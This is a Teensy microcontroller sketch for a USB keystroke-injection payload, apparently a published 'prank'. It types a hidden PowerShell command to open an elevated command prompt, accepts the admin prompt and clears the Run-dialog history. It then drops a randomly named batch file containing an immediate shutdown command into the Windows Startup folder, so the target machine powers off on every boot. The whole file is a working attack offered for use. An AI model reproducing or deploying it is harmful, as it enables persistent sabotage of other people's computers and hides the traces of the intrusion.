/*

Teensy ( https://www.pjrc.com/teensy/ )

Payload: windows-shutdown-prank

Disclaimer: Use at own risk, the functions used in this program will render your machine virtually useless.

Description: Opens a command prompt as administrator with run, uses con copy to create shutdown/restart/logoff batch.

Then save as .bat file under the startup folder and runs every startup.

You can optionally choose to avoid executing the batch file after writing.

Using US Keyboard Layout. Modify delays depending on the target machine. Tested Windows 7 and Windows 10.

Concept: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---restart-prank

Created by Kleo Bercero - @kbeflo - kbeflo@gmail.com

*/

#include <paensy.h>

int ds = 500;

void setup() {

  // Configure the delay that everything else scales off of.
  SetDelay(200);
  // Configure the delay that the Morse code uses.
  SetMorseDelay(250);

  // Perform an initial delay to give the USB time to prepare.
  PerformInitDelay();

  // LED pin number, 13 for 3.1
  // 11 for 2 and 2.x
  SetLEDPin(13);
  // Put the pin into output mode
  pinMode(LED_PIN, OUTPUT);
  // Turn on the LED pin so we know the device is running.
  digitalWrite(LED_PIN, HIGH);
  delay(3000);
  // Run cmd as administrator on small window with white background, yellow text and clear run command history
  Keyboard.set_modifier(MODIFIERKEY_GUI);
  Keyboard.set_key1(KEY_R);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(500);
  Keyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass \"Start-Process cmd -A '/t:fe /k mode con lines=1 cols=18&reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f' -Verb runAs\"");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(3000);
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.set_key1(KEY_Y);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(2000);
  // Change directory to startup programs
  Keyboard.print("cd %UserProfile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(500);
  // Write shutdown batch
  Keyboard.print("copy con ctx4dpui7l.bat");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.print("@echo off");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  // Usage /s to shutdown, /r to restart and /l to logoff the user. For delay /t x, valid range is 0-315360000 (10 years) default is 30.
  Keyboard.print("shutdown /s /t 0");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(500);
  Keyboard.set_modifier(MODIFIERKEY_CTRL);
  Keyboard.set_key1(KEY_Z);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(500);
  // End of file
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(500);
  // Optional: Comment block to avoid executing batch, making it dormant until the next and every startup.
  Keyboard.print("ctx4dpui7l.bat");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(500);

}

void loop()
{
  // blink quickly when complete
  digitalWrite(LED_PIN, HIGH);
  delay(ds/2);
  digitalWrite(LED_PIN, LOW);
  delay(ds/2);
}
